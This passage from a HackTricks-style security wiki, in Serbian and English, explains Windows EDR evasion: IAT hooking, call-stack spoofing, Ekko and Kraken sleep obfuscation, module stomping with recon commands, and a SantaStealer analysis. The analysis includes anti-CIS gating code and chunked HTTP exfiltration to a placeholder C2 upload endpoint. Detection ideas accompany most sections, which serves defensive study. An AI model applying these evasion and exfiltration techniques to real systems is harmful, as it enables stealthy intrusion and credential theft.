- Memory mask/unmask oko poziva (npr. encrypt beacon region-e, RWX→RX, promena page name-ova/permissions), pa zatim restore post-call.
- Call-stack spoofing: konstruisanje benignog stack-a i prelazak u target API tako da call-stack analiza razrešava očekivane frame-ove.
- Radi kompatibilnosti, exportujte interface tako da Aggressor script (ili ekvivalent) može da registruje koje API-je treba hook-ovati za Beacon, BOFs i post-ex DLL-ove.

Zašto IAT hooking ovde
- Radi za svaki code koji koristi hook-ovani import, bez modifikovanja tool code-a ili oslanjanja na Beacon da proxy-uje određene API-je.
- Pokriva post-ex DLL-ove: hook-ovanje LoadLibrary* omogućava vam da intercept-ujete module load-ove (npr. System.Management.Automation.dll, clr.dll) i primenite isto maskiranje/stack evasion na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za pokretanje procesa protiv detections baziranih na call-stack-u, tako što wrap-uje CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja import-a. Reflective loaders poput TitanLdr/AceLdr pokazuju hookovanje tokom DllMain učitane module.
- Drži wrapper-e malim i PIC-safe; razreši pravi API preko originalne IAT vrednosti koju si uhvatio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj da ostaviš stranice koje su writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stub-ovi prave lažni call chain (return addresses u benign module-ima), a zatim pivot-uju u pravi API.
- Ovo zaobilazi detekcije koje očekuju canonical stack-ove od Beacon/BOFs ka sensitive API-jima.
- Upari sa stack cutting i stack stitching tehnikama da sletiš unutar očekivanih frame-ova pre API prologue-a.

Operational integration
- Prepend the reflective loader na post-ex DLL-ove tako da se PIC i hook-ovi inicijalizuju automatski kada se DLL učita.
- Koristi Aggressor script da registruješ target API-je tako da Beacon i BOFs transparentno koriste isti evasion path bez izmene koda.

Detection/DFIR considerations
- IAT integrity: stavke koje se razrešavaju na non-image (heap/anon) adrese; periodična verifikacija import pointer-a.
- Stack anomalies: return addresses koji ne pripadaju učitanim images; abrupt transitions na non-image PIC; nekonzistentan RtlVirtualUserThreadStart ancestry.
- Loader telemetry: in-process upisi u IAT, rana DllMain aktivnost koja menja import thunk-ove, neočekivane RX region-e kreirane pri load-u.
- Image-load evasion: ako hookuješ LoadLibrary*, nadgledaj sumnjive load-ove automation/clr assembly-ja korelisane sa memory masking događajima.

Related building blocks and examples
- Reflective loaders koji rade IAT patching tokom load-a (npr. TitanLdr, AceLdr)
- Memory masking hook-ovi (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ako kontrolišeš reflective loader, možeš hookovati import-e **tokom** `ProcessImports()` tako što ćeš zameniti loader-ov `GetProcAddress` pointer custom resolver-om koji prvo proverava hook-ove:

- Napravi **resident PICO** (persistent PIC object) koji opstaje nakon što transient loader PIC oslobodi sam sebe.
- Export-uj `setup_hooks()` funkciju koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress`, preskoči ordinal import-e i koristi hash-based hook lookup kao `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; inače delegiraj pravom `GetProcAddress`.
- Registruj hook target-e na link time sa Crystal Palace `addhook "MODULE$Func" "hook"` unosima. Hook ostaje validan jer živi unutar resident PICO.

Ovo daje **import-time IAT redirection** bez patchovanja code section-a učitane DLL-ice posle load-a.

### Forcing hookable imports when the target uses PEB-walking

Import-time hook-ovi se aktiviraju samo ako je funkcija stvarno u target-ovoj IAT. Ako modul razrešava API-je preko PEB-walk + hash (nema import entry), nateraj pravi import tako da loader-ov `ProcessImports()` path to vidi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao `&WaitForSingleObject`.
- Compiler emituje IAT entry, što omogućava interception kada reflective loader razrešava import-e.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duge wait-ove, omotaj poziv u Ekko-style obfuscation chain koji enkriptuje in-memory image tokom idle-a:

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa crafted `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapped image-om → izvrši blocking wait → RC4 decrypt → **vrati per-section permissions** prolaskom kroz PE section-e → signal completion.
- `RtlCaptureContext` daje template `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operational detail: vrati “success” za duge wait-ove (npr. `WAIT_OBJECT_0`) tako da caller nastavi dok je image maskiran. Ovaj obrazac skriva modul od scanner-a tokom idle prozora i izbegava klasičan potpis “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callback-ova koji pokazuju ka `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim contiguous buffer-ima veličine image-a.
- Large-range `VirtualProtect` praćen custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Na CFG-enabled target-ima, prvi indirektni jump u mid-function gadget kao što je `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN` jer gadget nije prisutan u CFG metadata module-a. Da bi Ekko/Kraken-style chain-ovi ostali živi u hardened procesima:

- Registruj svaku indirektnu destinaciju koju chain koristi sa `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` unosima.
- Za adrese unutar učitanih images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počne na **image base** i pokriva **punu veličinu image-a**.
- Za manualno mapirane/PIC/stomped regione, koristi **allocation base** i allocation size umesto toga.
- Označi ne samo dispatch gadget, već i exporte do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) i sve attacker-controlled executable section-e koje će postati indirektni target-i.

Ovo pretvara ROP/JOP-style sleep chain-ove iz “radi samo u non-CFG procesima” u reusable primitive za `explorer.exe`, browser-e, `svchost.exe`, i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Potpuna `CONTEXT` zamena je bučna i može da pukne na CET Shadow Stack sistemima jer spoofed `Rip` i dalje mora da se slaže sa hardware shadow stack-om. Bezbedniji sleep-masking obrazac je:

- Izaberi drugi thread u istom procesu i pročitaj njegove `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Sačuvaj realni TEB/TIB trenutnog thread-a.
- Uhvatite realni sleeping context sa `GetThreadContext`.
- Kopiraj **samo** realni `Rip` u spoof context, a ostavi spoofed `Rsp`/stack state netaknutim.
- Tokom sleep prozora, kopiraj spoof thread-ov `NT_TIB` u current TEB tako da stack walker-i unwind-uju unutar legitimnog stack range-a.
- Nakon što wait završi, vrati originalni TIB i thread context.

Ovo čuva CET-konzistentan instruction pointer, a istovremeno zavarava EDR stack walker-e koji veruju TEB stack metadata-i za validaciju unwind-a.

### APC-based alternative: Kraken Mask

Ako je timer-queue dispatch previše signatured, ista sleep-encrypt-spoof-restore sekvenca može da se izvrši iz suspended helper thread-a koristeći queued APC-ove:

- Napravi helper thread sa `NtTestAlert` kao entrypoint.
- Queue-uj pripremljene `CONTEXT` frame-ove/APC-ove sa `NtQueueApcThread` i isprazni ih sa `NtAlertResumeThread`.
- Čuvaj chain state na heap-u umesto na helper stack-u da izbegneš iscrpljivanje default 64 KB thread stack-a.
- Koristi `NtSignalAndWaitForSingleObject` da atomski signaliziraš start event i blokiraš.
- Suspenduj main thread pre vraćanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) da smanjiš race window gde scanner može da uhvati polu-vraćen stack.

Ovo menja `CreateTimerQueueTimer` + `NtContinue` potpis za helper-thread/APC potpis, uz zadržavanje istih RC4 masking i stack-spoofing ciljeva.

Additional detection ideas
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep, wait ili APC dispatch.
- `GetThreadContext`/`SetThreadContext` oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u current thread-ov TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno dostižu `SystemFunction032`, `VirtualProtect`, ili helper-e za per-section permission restoration.
- Ponovljena upotreba kratkih gadget signatura kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-i unutar signed module-ova.


## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` section-a DLL-a koji je već mapiran unutar target procesa** umesto da alocira očiglednu private executable memoriju ili učitava novu žrtvenu DLL-icu. Target za overwrite treba da bude **učitan, disk-backed image** čiji code space može da apsorbuje payload bez kvarenja code path-ova koji su procesu i dalje potrebni.

### Reliable target selection

Naivni stomping protiv uobičajenih module-ova kao što su `uxtheme.dll` ili `comctl32.dll` je krhak: DLL možda nije učitan u remote procesu, a premali code region će srušiti proces. Pouzdaniji workflow je:

1. Enumeriši module target procesa i vodi **names-only include list** DLL-ova koji su već učitani.
2. Prvo build-uj payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj kandidat DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od file size-a jer odražava veličinu executable section-a **kada je mapiran u memoriji**.
4. Parsiraj **Export Address Table (EAT)** i izaberi exportovanu funkciju RVA kao stomping start offset.
5. Izračunaj **blast radius**: ako payload prelazi izabranu funkcijsku granicu, prepišeće susedne export-e raspoređene iza nje u memoriji.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Preferiraj DLL-ove koji su **već učitani** u udaljenom procesu kako bi se izbegla telemetrija `LoadLibrary`/neočekivani image load-ovi.
- Preferiraj exporte koji se retko izvršavaju u ciljnoj aplikaciji; u suprotnom, normalne code path-ove mogu pogoditi stomped bajtove pre ili posle kreiranja threada.
- Veliki implanti često zahtevaju promenu ugradnje shellcode-a iz string literala u **byte-array/braced initializer** kako bi ceo buffer bio ispravno predstavljen u injector source-u.

Ideje za detekciju
- Remote writes u **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto uobičajenijih private RWX/RX alokacija.
- Export entry point-ovi čiji bajtovi u memoriji više ne odgovaraju backing file-u na disku.
- Remote thread-ovi ili context pivot-ovi koji počinju izvršavanje unutar legitimnog DLL export-a čijih je prvih nekoliko bajtova nedavno modifikovano.
- Sumnjivi `VirtualProtect(Ex)` / `WriteProcessMemory` nizovi prema DLL `.text` page-ovima, praćeni kreiranjem threada.

## SantaStealer Tradecraft za Fileless Evasion i Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako se moderni info-stealer-i kombinuju AV bypass, anti-analysis i credential access u jednom workflow-u.

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) nabraja instalirane keyboard layout-ove preko `GetKeyboardLayoutList`. Ako se pronađe Cyrillic layout, sample ubacuje prazan `CIS` marker i završava pre pokretanja stealer-a, obezbeđujući da se nikad ne detonira na isključenim locale-ovima, dok istovremeno ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita `check_antivm` logika

- Varijanta A prolazi kroz listu procesa, hešira svako ime pomoću prilagođenog rolling checksum-a i poredi ga sa ugrađenim blocklists za debuggers/sandboxes; ponavlja checksum nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B ispituje sistemska svojstva (donja granica broja procesa, nedavno uptime), poziva `OpenServiceA("VBoxGuest")` da bi detektovala VirtualBox additions, i radi timing provere oko sleep-ova da otkrije single-stepping. Svaki pogodak prekida izvršavanje pre nego što se moduli pokrenu.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili upisuje na disk ili ručno mapira u memoriji; fileless režim sam rešava imports/relocations tako da se ne upisuju helper artifacts.
- Taj helper čuva drugostepeni DLL dvaput šifrovan ChaCha20-om (dva 32-byte keys + 12-byte nonces). Nakon oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator rutine koriste direct-syscall reflective process hollowing da injektuju u aktivan Chromium browser, naslede AppBound Encryption keys i dešifruju passwords/cookies/credit cards direktno iz SQLite databases uprkos ABE hardening-u.


### Modularno prikupljanje u memoriji & chunked HTTP exfil

- `create_memory_based_log` prolazi kroz globalnu `memory_generators` tabelu function-pointer-a i pokreće jednu thread po omogućen modulu (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Svaka thread upisuje rezultate u shared buffers i prijavljuje broj fajlova nakon ~45s join window-a.
- Kada se završi, sve se zipuje statički linkovanom `miniz` bibliotekoom kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15s i šalje arhivu u 10 MB chunk-ovima putem HTTP POST na `http://<C2>:6767/upload`, lažirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji chunk dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
